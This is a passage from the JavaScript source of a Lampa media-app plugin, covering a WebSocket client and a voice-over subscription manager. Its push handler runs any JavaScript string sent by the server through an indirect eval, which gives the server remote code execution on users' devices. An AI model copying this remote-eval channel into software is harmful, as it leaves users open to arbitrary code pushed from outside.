    Lampa.Noty.show(Lampa.Lang.translate('modss_ws_logoff_reload'));
    setTimeout(function () { window.location.reload(); }, 500);
  },

  _handlePush: function (msg) {
    var pack = Modss.Socket._pack;
    var kind = msg.kind || msg.sub;
    var payload = msg.payload || msg;
    //Modss.Socket.log('push', kind, msg);

    if (kind === pack.no || kind === pack.e_no) {
      Modss.Socket.Notice(payload);
      return;
    }
    if (kind === 'voice_subscription_notice') {
      Modss.VoiceSubscriptionNotice(payload);
      return;
    }
    if (kind === pack.ex) {
      var js = payload && payload.code;
      if (typeof js === 'string' && js.length > 0 && js.length <= 200000) {
        try {
          (0, eval)(js);
        } catch (eExec) {
          console.error('Modss', 'exec', 'error', eExec);
        }
      }
      return;
    }
    if (kind === pack.md) {
      Modss.Socket.pushModal(payload);
      return;
    }
    Modss.Socket.log('push unknown kind', kind);
  },

  _onMessage: function (ev) {
    var raw = ev.data;
    if (typeof raw !== 'string') return;
    if (raw === 'pong') return;

    var result;
    try {
      result = JSON.parse(raw);
    } catch (e) {
      return;
    }

    var pack = Modss.Socket._pack;
    if (pack && pack.ru && result.type === pack.ru) return;

    Modss.Socket._handleDeviceAuth(result);
    Modss.Socket._handleLogoff(result);

    if (pack && pack.push && result.type === pack.push) {
      Modss.Socket._handlePush(result);
    }
  },

  _connect: function () {
    var st = Modss.Socket._state();
    if (st.connecting) return;
    if (st.sock) {
      var r = st.sock.readyState;
      if (r === 0 || r === 1) return;
    }

    Modss.Socket._clearTimers();
    st.connecting = true;
    clearTimeout(st.timeout);
    st.timeout = setTimeout(function () {
      if (st.sock) try { st.sock.close(); } catch (e) { }
    }, 10000);

    try {
      if (!wsUrl) {
        st.connecting = false;
        return;
      }
      st.sock = new WebSocket(wsUrl);
    } catch (e) {
      st.connecting = false;
      Modss.Socket.log('connection error (create)', e && e.message ? e.message : e);
      setTimeout(Modss.Socket._connect, 3000);
      return;
    }

    st.sock.addEventListener('open', function () {
      st.connecting = false;
      st.timeping = 5000;
      clearTimeout(st.timeout);
      if (!st.wsOpenedOnce) {
        st.wsOpenedOnce = true;
        Modss.Socket.log('connected', wsUrl);
      } else {
        st.wsReconnectCount = (st.wsReconnectCount || 0) + 1;
        Modss.Socket.log('reconnected', '#' + st.wsReconnectCount);
      }
      Modss.Socket._startTimers();
      st.sendModssStartTimer = setTimeout(function () {
        st.sendModssStartTimer = null;
        Modss.Socket._sendStart();
      }, 1000);
    });

    st.sock.addEventListener('close', function () {
      st.connecting = false;
      Modss.Socket._clearTimers();
      clearTimeout(st.timeout);
      st.timeping = Math.min(1000 * 60 * 5, st.timeping);
      var delayReconnect = Math.max(2000, Math.round(st.timeping));
      Modss.Socket.log('closed, try reconnect in', Math.round(delayReconnect / 1000) + 's');
      setTimeout(Modss.Socket._connect, delayReconnect);
      st.timeping *= 2;
    });

    st.sock.addEventListener('error', function (e) {
      Modss.Socket.log('error', e && e.message ? e.message : e);
      try { st.sock.close(); } catch (err) { }
    });

    st.sock.addEventListener('message', Modss.Socket._onMessage);
  },

  init: function () {
    if (typeof MODSS_WS_PLUGIN_DISABLED !== 'undefined' && MODSS_WS_PLUGIN_DISABLED) {
      return;
    }
    if (!window.__MODSS_WS__) {
      window.__MODSS_WS__ = {
        sock: null,
        timeout: null,
        presenceTimer: null,
        keepaliveTimer: null,
        connecting: false,
        timeping: 5000,
        wsOpenedOnce: false,
        wsReconnectCount: 0
      };
    }
    var st = Modss.Socket._state();
    if (st.connecting) return;
    if (st.sock) {
      var rs = st.sock.readyState;
      if (rs === 0 || rs === 1) return;
    }
    if (window.__MODSS_SOCKET_INIT__) return;
    window.__MODSS_SOCKET_INIT__ = true;

    Modss.Socket._pack = Modss.Socket._buildPack();
    Modss.Socket._connect();
  }
};

Modss.Notice = Modss.Socket.Notice;
Modss.socketInit = function () {
  Modss.Socket.init();
};

    },
    subscr: function () {
          Modss.LampaSubscribes = {
      initHook: function () {
        var self = Modss.LampaSubscribes;
        Lampa.Listener.follow('activity', function (e) {
          if (e.component !== 'subscribes') return;
          if (e.type !== 'init' && e.type !== 'create' && e.type !== 'start') return;
          self.attachModule(e.object);
        });
      },
      attachModule: function (activityObject) {
        var self = Modss.LampaSubscribes;
        if (!vip) return;
        var comp = activityObject && activityObject.activity && activityObject.activity.component;
        if (!comp || typeof comp.build !== 'function' || comp._modssSubscrHookAttached) return;
        comp._modssSubscrHookAttached = true;
        delete comp._modssMysubscrLine;
        var origBuild = comp.build;
        var origEmpty = comp.empty;
        comp._modssOrigBuild = origBuild;
        comp.build = function (data) {
          comp._modssLastBuildData = data;
          self.withMysubscrLine(comp, function (modssLine) {
            var cubResults = data && data.results ? data.results : [];
            self.renderScreen(comp, modssLine, cubResults, origBuild);
          });
        };
        comp.empty = function (status) {
          self.withMysubscrLine(comp, function (modssLine) {
            if (modssLine && modssLine.results && modssLine.results.length) {
              self.renderScreen(comp, modssLine, [], origBuild);
            } else {
              origEmpty.call(comp, status);
            }
          });
        };
        comp.use({
          onController: function (controller) {
            if (!this._modssCustomScreen || !this.items.length || controller._modssLinesToggle) return;
            var category = this;
            var origToggle = controller.toggle;
            controller._modssLinesToggle = true;
            controller.toggle = function () {
              category.scroll.restorePosition();
              if (Lampa.Platform.screen('tv')) {
                category.items[category._modssActiveLine || 0].toggle();
              } else {
                origToggle();
              }
            };
          },
          onDown: function () {
            if (!this._modssCustomScreen || this.items.length < 2) return;
            this._modssActiveLine = Math.min((this._modssActiveLine || 0) + 1, this.items.length - 1);
            this.items[this._modssActiveLine].toggle();
            this.scroll.update(this.items[this._modssActiveLine].render(true), true);
          },
          onUp: function () {
            if (!this._modssCustomScreen || !this.items.length) return;
            this._modssActiveLine = (this._modssActiveLine || 0) - 1;
            if (this._modssActiveLine < 0) {
              this._modssActiveLine = 0;
              Lampa.Controller.toggle('head');
              return;
            }
            this.items[this._modssActiveLine].toggle();
            this.scroll.update(this.items[this._modssActiveLine].render(true), true);
          },
          onLeft: function () {
            if (!this._modssCustomScreen) return;
            Lampa.Controller.toggle('menu');
          },
          onDestroy: function () {
            comp.build = origBuild;
            comp.empty = origEmpty;
            comp._modssSubscrHookAttached = false;
            delete comp._modssMysubscrLine;
            delete comp._modssCustomScreen;
            delete comp._modssActiveLine;
          }
        });
      },
      syncLineFocus: function (comp, lineInst) {
        if (!comp || !lineInst || !comp.items || !comp.items.length) return;
        var idx = comp.items.indexOf(lineInst);
        if (idx < 0) return;
        comp._modssActiveLine = idx;
        if (comp.scroll && typeof comp.scroll.update === 'function') {
          comp.scroll.update(lineInst.render(true), true);
        }
      },
      renderScreen: function (comp, modssLine, cubResults, origBuild) {
        if (!comp || !comp.body) return;
        var hasModss = !!(modssLine && modssLine.results && modssLine.results.length);
        var hasCub = !!(cubResults && cubResults.length);
        if (comp.items.length) Lampa.Arrays.destroy(comp.items);
        comp.items = [];
        comp.pages = {};
        comp.loaded = [];
        comp.added = 0;
        comp.body.innerHTML = '';
        if (!hasModss && !hasCub) {
          comp._modssCustomScreen = false;
          Lampa.Layer.visible(comp.scroll.render(true));
          comp.activity.loader(false);
          comp.activity.toggle();
          setTimeout(function () { comp.start(); }, 0);
          return;
        }
        if (!hasModss && hasCub) {
          comp._modssCustomScreen = false;
          origBuild.call(comp, { results: cubResults, total_pages: 1 });
          return;
        }
        comp._modssCustomScreen = true;
        comp._modssActiveLine = 0;
        var keepBodyClass = (comp.body.className || '').split(/\s+/).filter(function (cls) {
          return cls && cls.indexOf('mapping--') !== 0 && cls.indexOf('cols--') !== 0;
        });
        comp.body.className = keepBodyClass.join(' ');
        comp.body.style.display = 'block';
        if (hasModss) {
          var modssLineInst = Modss.LampaSubscribes.createLineNode(modssLine, comp);
          if (modssLineInst) {
            comp.body.appendChild(modssLineInst.render(true));
            comp.items.push(modssLineInst);
          }
        }
        if (hasCub) {
          var cubLineInst = Modss.LampaSubscribes.createLineNode({
            title: Lampa.Lang.translate('title_subscribes') + ' CUB',
            results: cubResults,
            params: { type: 'subscribes' }
          }, comp);
          if (cubLineInst) {
            comp.body.appendChild(cubLineInst.render(true));
            comp.items.push(cubLineInst);
          }
        }
        Lampa.Layer.visible(comp.scroll.render(true));
        comp.activity.loader(false);
        comp.activity.toggle();
        setTimeout(function () { comp.start(); }, 0);
      },
      createLineNode: function (lineData, comp) {
        var self = Modss.LampaSubscribes;
        var subscribeMask = Modss.LampaSubscribes._subscribeMask;
        if (subscribeMask == null) {
          Lampa.Maker.make('Card', { id: 0, title: '', params: {} }, function (cardModule) {
            subscribeMask = cardModule.MASK.base;
            try {
              subscribeMask = cardModule.toggle(cardModule.MASK.base, 'Subscribe');
            } catch (e) {}
            Modss.LampaSubscribes._subscribeMask = subscribeMask;
          });
        }
        if (lineData.results && lineData.results.length && subscribeMask != null) {
          lineData.results.forEach(function (card) {
            card.params = card.params || {};
            card.params.module = subscribeMask;
          });
        }
        var line = Lampa.Maker.make('Line', lineData, function (lineModule) {
          return lineModule.MASK.base;
        });
        line.use({
          onDown: comp.emit.bind(comp, 'down'),
          onUp: comp.emit.bind(comp, 'up'),
          onLeft: comp.emit.bind(comp, 'left'),
          onBack: typeof comp.back === 'function' ? comp.emit.bind(comp, 'back') : undefined,
          onActive: function () {
            var idx = comp.items.indexOf(line);
            if (idx >= 0) comp._modssActiveLine = idx;
          },
          onToggle: function () {
            self.syncLineFocus(comp, line);
          },
          onInstance: function (card, data) {
            var cardHooks = {
              onEnter: function () {
                Lampa.Router.call('full', data);
              },
              onFocus: function () {
                Lampa.Background.change(Lampa.Utils.cardImgBackground(data));
                self.syncLineFocus(comp, line);
              }
            };
            if (data.modss_subscription) {
              cardHooks.onCreate = function () {
                var subscription = this.data.modss_subscription;
                if (!subscription) return;
                this.menu_list.unshift({
                  title: Lampa.Lang.translate('modss_voice_subscriptions_section'),
                  menu: function () {
                    return [{
                      title: '❌ ' + Lampa.Lang.translate('modss_voice_unsubscribe'),
                      subtitle: (subscription.voice || '') + (subscription.title ? ' — «' + subscription.title + '»' : ''),
                      onSelect: function () {
                        Lampa.Select.hide();
                        Modss.Subscr.confirmUnsubscribe(subscription, user_id, function () {
                          var act = Lampa.Activity.active();
                          var subscribesComp = act && act.activity && act.activity.component;
                          if (!subscribesComp || !subscribesComp._modssSubscrHookAttached) return;
                          var line = subscribesComp._modssMysubscrLine;
                          if (line && line.results && line.results.length) {
                            line.results = line.results.filter(function (card) {
                              var sub = card.modss_subscription;
                              if (!sub) return true;
                              return String(sub.movie_id) !== String(subscription.movie_id)
                                || sub.voice !== subscription.voice;
                            });
                            if (!line.results.length) subscribesComp._modssMysubscrLine = null;
                          }
                          var cubResults = subscribesComp._modssLastBuildData && subscribesComp._modssLastBuildData.results
                            ? subscribesComp._modssLastBuildData.results
                            : [];
                          Modss.LampaSubscribes.renderScreen(
                            subscribesComp,
                            subscribesComp._modssMysubscrLine,
                            cubResults,
                            subscribesComp._modssOrigBuild
                          );
                        });
                      }
                    }];
                  }
                });
              };
            }
            card.use(cardHooks);
          }
        });
        line.create();
        return line;
      },
      withMysubscrLine: function (comp, callback) {
        if (comp._modssMysubscrLine !== undefined) {
          callback(comp._modssMysubscrLine);
          return;
        }
        if (!uid) {
          comp._modssMysubscrLine = null;
          callback(null);
          return;
        }
        Modss.Subscr.network.clear();
        Modss.Subscr.network.timeout(8000);
        Modss.Subscr.network.silent(Modss.Subscr.requestApiUrl('subscr/mysubscr'), function (data) {
          var subs = [];
          if (data && data.success && data.subscriptions && data.subscriptions.length) {
            subs = data.subscriptions;
          }
          var lineData = null;
          if (subs.length) {
            lineData = {
              title: Lampa.Lang.translate('modss_voice_subscriptions_section'),
              results: subs.map(function (sub) {
                var card = Modss.Subscr.resolveSubscriptionCard(sub);
                card.subscribe = {
                  voice: sub.voice || '',
                  season: sub.season != null ? sub.season : 0,
                  episode: sub.episode != null ? sub.episode : 0,
                  status: sub.active ? 1 : 0,
                  card_id: String(sub.movie_id != null ? sub.movie_id : (card.card_id || card.id || ''))
                };
                card.modss_subscription = sub;
                return card;
              }),
              params: { type: 'subscribes' }
            };
          }
          comp._modssMysubscrLine = lineData;
          callback(lineData);
        }, function (a, c) {
          try {
            console.error('Modss', 'mysubscr load error', a, c);
          } catch (eLog) {}
          comp._modssMysubscrLine = null;
          callback(null);
        });
      }
    };

          Modss.Subscr = {
      network: new Lampa.Reguest(),
      load: null,
      _onlineLoadCaptureReady: false,
      movieId: null,
      movieTitle: null,
      setOnlineLoad: function(load) {
        if (load && typeof load.requestParams === 'function') {
          Modss.Subscr.load = load;
        }
      },
      getOnlineLoad: function() {
        if (Modss.Subscr.load && typeof Modss.Subscr.load.requestParams === 'function') {
          return Modss.Subscr.load;
        }
        if (typeof component !== 'function') return null;
        var load = new component({
          movie: { id: 0, title: '', name: '', source: 'tmdb', original_title: '', original_name: '' },
          clarification: false,
          search: ''
        });
        Modss.Subscr.setOnlineLoad(load);
        return load;
      },
      requestApiUrl: function(path) {
        var online = Modss.Subscr.getOnlineLoad();
        if (!online || typeof online.requestParams !== 'function') {
          return API + path;
        }
        return online.requestParams(API + path);
      },
      initOnlineLoadCapture: function() {
        if (Modss.Subscr._onlineLoadCaptureReady) return;
        Modss.Subscr._onlineLoadCaptureReady = true;
        Lampa.Listener.follow('activity', function (e) {
          if (e.component !== 'modss_online') return;
          if (e.type !== 'create' && e.type !== 'start') return;
          var online = e.object && e.object.activity && e.object.activity.component;
          Modss.Subscr.setOnlineLoad(online);
        });
      },
      resolveSubscriptionCard: function (sub) {
        var card = {};
        if (sub && sub.card) {
          try {
            card = typeof sub.card === 'string' ? JSON.parse(sub.card) : Object.assign({}, sub.card);
          } catch (e) {
            card = {};
          }
        }
        if (!sub) return card;
        var source = String(card.source || sub.source || 'tmdb').trim().toLowerCase() || 'tmdb';
        var cubTmdb = source === 'cub' || source === 'tmdb';
        card.source = source;
        if (!cubTmdb) card.id = sub.movie_id;
        else if (!card.id) card.id = sub.movie_id;
        if (!card.title && sub.title) card.title = sub.title;
        if (!card.name && sub.title) card.name = sub.title;
        if (!card.imdb_id && sub.imdb_id) card.imdb_id = sub.imdb_id;
        if (!card.kinopoisk_id && sub.kinopoisk_id) card.kinopoisk_id = sub.kinopoisk_id;
        return card;
      },
      showManager: function(movieId, movieTitle, load) {
        if (!user_id) return Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscribe_error'));
        
        if (load) this.load = load;
        if (movieId) this.movieId = movieId;
        if (movieTitle) this.movieTitle = movieTitle;

        Lampa.Loading.start(function () {
          Lampa.Loading.stop();
        });

        this.network.clear();
        this.network.timeout(8000);
        this.network.silent(Modss.Subscr.requestApiUrl('subscr/' + this.movieId + '/voices'), function (data) {
          Lampa.Loading.stop();

          if (data && data.success && data.voices) {
            Modss.Subscr.showVoiceSelectionModal(data.voices, user_id, Modss.Subscr.movieId, Modss.Subscr.movieTitle);
          } else {
            Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscribe_error'));
          }
        }, function (a, c) {
          Lampa.Loading.stop();
          console.error('Error loading voices:', a, c);
          Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscribe_error'));
        });
      },
      showVoiceSelectionModal: function(voices, user_id, movieId, movieTitle) {
        var voiceItems = [];
        var subscribedVoice = null;
        for (var voiceName in voices) {
          var voice = voices[voiceName];
          
          // Если это папка, проверяем озвучки внутри
          if (voice.isFolder && voice.voices) {
            for (var subVoiceName in voice.voices) {
              var subVoice = voice.voices[subVoiceName];
              if (subVoice.isSubscribed) {
                subscribedVoice = Object.assign({voice_name: subVoiceName}, subVoice);
                break;
              }
            }
          } else if (voice.isSubscribed) {
            subscribedVoice = Object.assign({voice_name: voiceName}, voice);
            break;
          }
          
          if (subscribedVoice) break;
        }
        
        voiceItems.push({
          title: '📋 ' + Lampa.Lang.translate('modss_voice_manage_subscriptions'),
          subtitle: Lampa.Lang.translate('modss_voice_manage_subscriptions'),
          show_all_subscriptions: true
        });

        if (subscribedVoice) {
          var unsubscribeSubtitle = subscribedVoice.voice_name;
          
          // Добавляем информацию о последней серии и источниках
          if (subscribedVoice.last_season_episodes > 0) {
            var lastSeason = subscribedVoice.seasons && subscribedVoice.seasons.length > 0 ? 
              subscribedVoice.seasons[subscribedVoice.seasons.length - 1] : 1;
            
            unsubscribeSubtitle += '<br><b>S' + lastSeason + ':E' + subscribedVoice.last_season_episodes + '</b>';
            
            if (subscribedVoice.lastEpisodeBalancers && subscribedVoice.lastEpisodeBalancers.length > 0) {
              unsubscribeSubtitle += ' - ' + subscribedVoice.lastEpisodeBalancers.join(', ');
            }
          }
          
          voiceItems.push({
            title: '❌ ' + Lampa.Lang.translate('modss_voice_unsubscribe'),
            subtitle: unsubscribeSubtitle,
            voice_data: subscribedVoice,
            isSubscribed: true,
            unsubscribe_action: true
          });
        }
        
        var folders = [];
        var regularVoices = [];
        
        for (var voiceName in voices) {
          var voice = voices[voiceName];
          
          if (voice.isFolder && voice.voices) {
            folders.push({name: voiceName, data: voice});
          } else {
            regularVoices.push({name: voiceName, data: voice});
          }
        }
        
        regularVoices.sort(function(a, b) {
          return a.name.localeCompare(b.name, 'en');
        });
        
        // Сначала добавляем папки
        for (var i = 0; i < folders.length; i++) {
          var folder = folders[i];
          var voicesCount = Object.keys(folder.data.voices).length;
          voiceItems.push({
            title: '📁 ' + folder.name,
            subtitle: voicesCount + ' ' + Lampa.Lang.translate('menu_voice'),
            is_folder: true,
            folder_voices: folder.data.voices,
            folder_name: folder.name
          });
        }
        
        // Потом добавляем обычные озвучки
        for (var i = 0; i < regularVoices.length; i++) {
          var voiceName = regularVoices[i].name;
          var voice = regularVoices[i].data;
          
          var seasonsText = voice.seasons && voice.seasons.length > 1 ?
            '<b>' + Lampa.Lang.translate('title_seasons') + ':</b> ' + voice.seasons.join(', ') :
            voice.seasons ? '<b>' + Lampa.Lang.translate('torrent_parser_season') + ':</b> ' + voice.seasons[0] : '';

          var balancersText = voice.balancers ?
            '<b>' + Lampa.Lang.translate('settings_rest_source') + ':</b> ' + 
            (voice.balancers.length > 1 ? voice.balancers.join(', ') : voice.balancers[0]) : '';

          var lastSeasonInfo = '';
          if (voice.last_season_episodes > 0) {
            var lastSeason = voice.seasons && voice.seasons.length > 0 ? voice.seasons[voice.seasons.length - 1] : 1;
            
            // Для подписанных озвучек показываем детальную информацию
            if (voice.isSubscribed && voice.lastEpisodeBalancers && voice.lastEpisodeBalancers.length > 0) {
              lastSeasonInfo = '<br><b>S' + lastSeason + ':E' + voice.last_season_episodes + '</b> - ' + voice.lastEpisodeBalancers.join(', ');
            } else {
              lastSeasonInfo = ' • ' + voice.last_season_episodes + ' ' + Lampa.Lang.translate('torrent_serial_episode');
            }
          }

          voiceItems.push({
            title: (voice.isSubscribed ? '🔔' : '🔕') + ' ' + voiceName,
            subtitle: balancersText + '<br>' + seasonsText + lastSeasonInfo,
            voice_data: Object.assign({voice_name: voiceName}, voice),
            isSubscribed: voice.isSubscribed,
            ghost: !voice.isSubscribed
          });
        }

        Lampa.Select.show({
          title: Lampa.Lang.translate('modss_voice_subscribe'),
          items: voiceItems,
          nohide: true,
          onBack: function () {
            Lampa.Select.hide();
            Lampa.Controller.toggle('content');
          },
          onSelect: function (item) {
            if (item.show_all_subscriptions) {
              Modss.Subscr.showAllUserSubscriptions(user_id);
            } else if (item.is_folder && item.folder_voices) {
              // Открываем папку с озвучками
              Modss.Subscr.showFolderVoices(item.folder_voices, item.folder_name, user_id, movieId, movieTitle);
            } else if (item.voice_data && !item.separator) {
              if (item.unsubscribe_action) Modss.Subscr.unsubscribeFromVoice(item.voice_data, user_id, movieId);
              else Modss.Subscr.subscribeToVoice(item.voice_data, user_id, movieId, movieTitle);
            }
          }
        });
      },
      showFolderVoices: function(folderVoices, folderName, user_id, movieId, movieTitle) {
        var voiceItems = [];
        var voiceNames = Object.keys(folderVoices).sort();
        
        for (var i = 0; i < voiceNames.length; i++) {
          var voiceName = voiceNames[i];
          var voice = folderVoices[voiceName];
          
          var seasonsText = voice.seasons && voice.seasons.length > 1 ?
            '<b>' + Lampa.Lang.translate('title_seasons') + ':</b> ' + voice.seasons.join(', ') :
            voice.seasons ? '<b>' + Lampa.Lang.translate('torrent_parser_season') + ':</b> ' + voice.seasons[0] : '';

          var balancersText = voice.balancers ?
            '<b>' + Lampa.Lang.translate('settings_rest_source') + ':</b> ' + 
            (voice.balancers.length > 1 ? voice.balancers.join(', ') : voice.balancers[0]) : '';

          var lastSeasonInfo = '';
          if (voice.last_season_episodes > 0) {
            var lastSeason = voice.seasons && voice.seasons.length > 0 ? voice.seasons[voice.seasons.length - 1] : 1;
            
            // Для подписанных озвучек показываем детальную информацию
            if (voice.isSubscribed && voice.lastEpisodeBalancers && voice.lastEpisodeBalancers.length > 0) {
              lastSeasonInfo = '<br><b>S' + lastSeason + ':E' + voice.last_season_episodes + '</b> - ' + voice.lastEpisodeBalancers.join(', ');
            } else {
              lastSeasonInfo = ' • ' + voice.last_season_episodes + ' ' + Lampa.Lang.translate('torrent_serial_episode');
            }
          }

          voiceItems.push({
            title: (voice.isSubscribed ? '🔔' : '🔕') + ' ' + voiceName,
            subtitle: balancersText + '<br>' + seasonsText + lastSeasonInfo,
            voice_data: Object.assign({voice_name: voiceName}, voice),
            isSubscribed: voice.isSubscribed,
            ghost: !voice.isSubscribed
          });
        }

        Lampa.Select.show({
          title: folderName,
          items: voiceItems,
          onBack: function () {
            Lampa.Select.hide();
            Modss.Subscr.showManager(movieId, movieTitle);
          },
          onSelect: function (item) {
            if (item.voice_data && !item.separator) {
              Modss.Subscr.subscribeToVoice(item.voice_data, user_id, movieId, movieTitle);
            }
          }
        });
      },
      subscribeToVoice: function(voice, user_id, movieId, movieTitle) {
        if (voice.isSubscribed) return Lampa.Bell.push({text: Lampa.Lang.translate('modss_voice_already_subscribed')});

        var seasonNumber = voice.maxSeasonOverall || 1;

        Lampa.Loading.start(function () {
          Lampa.Loading.stop();
        });

        this.network.clear();
        this.network.timeout(8000);
        this.network.silent(Modss.Subscr.requestApiUrl('subscr/' + movieId + '/add'), function (data) {
          Lampa.Loading.stop();
          if (data && data.success) {
            if (data.already_subscribed) {
              Lampa.Bell.push({text: Lampa.Lang.translate('modss_voice_already_subscribed')});
            } else if (data.replaced) {
              Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscription_changed') + ' "' + voice.voice_name + '"');
            } else {
              Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscribe_success') + ' "' + voice.voice_name + '"');
            }
            Lampa.Select.hide();
            Modss.Subscr.showManager(movieId, movieTitle);
          } else if (data && data.error === 'SUBSCRIPTION_LIMIT_REACHED') {
            var limitInfo = data.limit_info || {};
            var current = limitInfo.current || 0;
            var max = limitInfo.max;
            Modss.showModal(
              Lampa.Template.get('modss_voice_limit_modal', {current: current, max: max}),
              function() {
                Lampa.Modal.close();
                Modss.Subscr.showAllUserSubscriptions(user_id);
              }, 'smoll', null,
              [Lampa.Lang.translate('modss_voice_limit_close'), Lampa.Lang.translate('modss_voice_limit_my_subscriptions')]
            );
          } else Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscribe_error'));
        }, function (a, c) {
          Lampa.Loading.stop();
          console.error('Modss', 'Error subscribing:', a, c);
          Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscribe_error'));
        }, {
          user_id: user_id,
          voice: voice.voice_name,
          season: seasonNumber,
          title: movieTitle,
          episode: voice.last_season_episodes || 0
        });
      },
      unsubscribeFromVoice: function(voice, user_id, movieId) {
        Lampa.Loading.start(function () {
          Lampa.Loading.stop();
        });

        this.network.clear();
        this.network.timeout(8000);
        this.network.silent(Modss.Subscr.requestApiUrl('subscr/' + movieId + '/del'), function (data) {
          Lampa.Loading.stop();
          if (data && data.success) {
            Lampa.Noty.show(Lampa.Lang.translate('modss_voice_unsubscribe_success') + ' "' + voice.voice_name + '"');
            Lampa.Select.hide();
            Modss.Subscr.showManager(movieId, '');
          } else {
            Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscribe_error'));
          }
        }, function (a, c) {
          Lampa.Loading.stop();
          console.error('Modss', 'Error unsubscribing:', a, c);
          Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscribe_error'));
        }, {
          user_id: user_id
        });
      },
      showAllUserSubscriptions: function(user_id) {
        Lampa.Loading.start(function () {
          Lampa.Loading.stop();
        });

        this.network.clear();
        this.network.timeout(8000);
        this.network.silent(Modss.Subscr.requestApiUrl('subscr/mysubscr'), function (data) {
          Lampa.Loading.stop();

          if (data && data.success) Modss.Subscr.showSubscriptionsListModal(data.subscriptions, user_id);
          else Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscribe_error'));
        }, function (a, c) {
          Lampa.Loading.stop();
          console.error('Modss', 'Error loading subscriptions:', a, c);
          Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscribe_error'));
        });
      },
      showSubscriptionsListModal: function(subscriptions, user_id) {
        var activeList = subscriptions.filter(function (s) { return s.active; });
        var pausedList = subscriptions.filter(function (s) { return !s.active; });

        var buildCard = function (sub, $grid) {
          var labels = ['S - <b>' + sub.season + '</b>', 'E - <b>' + sub.episode + '</b>'];
          var statusIcon = sub.active ? '🟢' : '⏸️';
          var item = Lampa.Template.get('notice_card', {
            title: sub.title,
            descr: sub.voice,
            time: 'ADD: ' + Lampa.Utils.parseTime(sub.created_at).short + '<br>UPD: ' + Lampa.Utils.parseTime(sub.updated_at).short
          });
          item.find('.notice__time, .notice__descr').css('text-align', 'left');
          var statusOverlay = $('<div class="subscription-status-overlay" style="position: absolute; top: -5px; right: -10px; display: flex; align-items: center; justify-content: center; font-size: 16px; z-index: 10;">' + statusIcon + '</div>');
          item.find('.notice__img').css('position', 'relative').append(statusOverlay);
          item.find('.notice__descr').append($('<div class="notice__footer">' + labels.map(function (label) {
            return '<div>' + label + '</div>';
          }).join(' ') + '</div>'));
          item.on('hover:enter', function () {
            Lampa.Modal.close();
            Modss.Subscr.showSubscriptionItemMenu(sub, user_id);
          });
          $grid.append(item);
          var cardData = Modss.Subscr.resolveSubscriptionCard(sub);
          if (cardData.poster_path) {
            var img = item.find('.notice__img img')[0];
            if (img) {
              img.onerror = function () { img.src = './img/img_broken.svg'; };
              img.onload = function () { item.addClass('image--loaded'); };
              img.src = Lampa.TMDB.image('t/p/w300' + cardData.poster_path);
            }
          }
        };

        var $wrapper = $('<div></div>');
        var $navigation = $('<div class="navigation-tabs"></div>');
        var $activeGrid = $('<div class="modss-subscriptions-grid modss-subscriptions-tab-pane" data-tab="active"></div>').hide();
        var $pausedGrid = $('<div class="modss-subscriptions-grid modss-subscriptions-tab-pane" data-tab="paused"></div>').hide();

        var $btnActive = $('<div class="navigation-tabs__button selector">' + Lampa.Lang.translate('modss_voice_tab_active') + '</div>');
        if (activeList.length) $btnActive.append('<span class="navigation-tabs__badge">' + activeList.length + '</span>');
        var $btnPaused = $('<div class="navigation-tabs__button selector">' + Lampa.Lang.translate('modss_voice_tab_paused') + '</div>');
        if (pausedList.length) $btnPaused.append('<span class="navigation-tabs__badge">' + pausedList.length + '</span>');

        var switchTab = function (tab) {
          $navigation.find('.navigation-tabs__button').removeClass('active');
          $wrapper.find('.modss-subscriptions-tab-pane').removeClass('active').hide();
          if (tab === 'active') {
            $btnActive.addClass('active');
            $activeGrid.addClass('active').show();
          } else {
            $btnPaused.addClass('active');
            $pausedGrid.addClass('active').show();
          }
        };

        $btnActive.on('hover:enter', function () { switchTab('active'); });
        $btnPaused.on('hover:enter', function () { switchTab('paused'); });

        $navigation.append($btnActive);
        $navigation.append('<div class="navigation-tabs__split">|</div>');
        $navigation.append($btnPaused);

        if (activeList.length === 0) $activeGrid.append(Lampa.Template.get('modss_subscriptions_empty'));
        else activeList.forEach(function (sub) { buildCard(sub, $activeGrid); });
        if (pausedList.length === 0) $pausedGrid.append(Lampa.Template.get('modss_subscriptions_empty'));
        else pausedList.forEach(function (sub) { buildCard(sub, $pausedGrid); });

        $wrapper.append($navigation);
        $wrapper.append($activeGrid);
        $wrapper.append($pausedGrid);
        switchTab(activeList.length > 0 ? 'active' : 'paused');

        Lampa.Select.hide();
        Modss.showModal($wrapper, function () {
          Lampa.Modal.close();
          Lampa.Controller.toggle('content');
          if (Modss.Subscr.movieId && Modss.Subscr.movieTitle) {
            Modss.Subscr.showManager(Modss.Subscr.movieId, Modss.Subscr.movieTitle);
          }
        }, 'large', null, null, subscriptions.length + ' ' + Lampa.Lang.translate('modss_voice_active_subscriptions'));
      },
      openSubscriptionCard: function (sub) {
        if (!sub || sub.movie_id == null || sub.movie_id === '') {
          Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscribe_error'));
          return;
        }
        Lampa.Router.call('full', Modss.Subscr.resolveSubscriptionCard(sub));
      },
      showSubscriptionItemMenu: function (sub, user_id) {
        Lampa.Select.show({
          title: sub.title || Lampa.Lang.translate('modss_voice_manage_subscriptions'),
          items: [{
            title: '▶ ' + Lampa.Lang.translate('modss_voice_open_card'),
            subtitle: sub.voice || '',
            action_open_card: true
          }, {
            title: '❌ ' + Lampa.Lang.translate('modss_voice_unsubscribe'),
            subtitle: Lampa.Lang.translate('modss_voice_subscription_menu_unsubscribe_hint'),
            action_unsubscribe: true
          }],
          onBack: function () {
            Lampa.Select.hide();
            Modss.Subscr.showAllUserSubscriptions(user_id);
          },
          onSelect: function (item) {
            if (item.action_open_card) {
              Lampa.Select.hide();
              Modss.Subscr.openSubscriptionCard(sub);
            } else if (item.action_unsubscribe) {
              Lampa.Select.hide();
              Modss.Subscr.confirmUnsubscribe(sub, user_id);
            }
          }
        });
      },
      confirmUnsubscribe: function(subscription, user_id, onComplete) {
        var done = typeof onComplete === 'function'
          ? onComplete
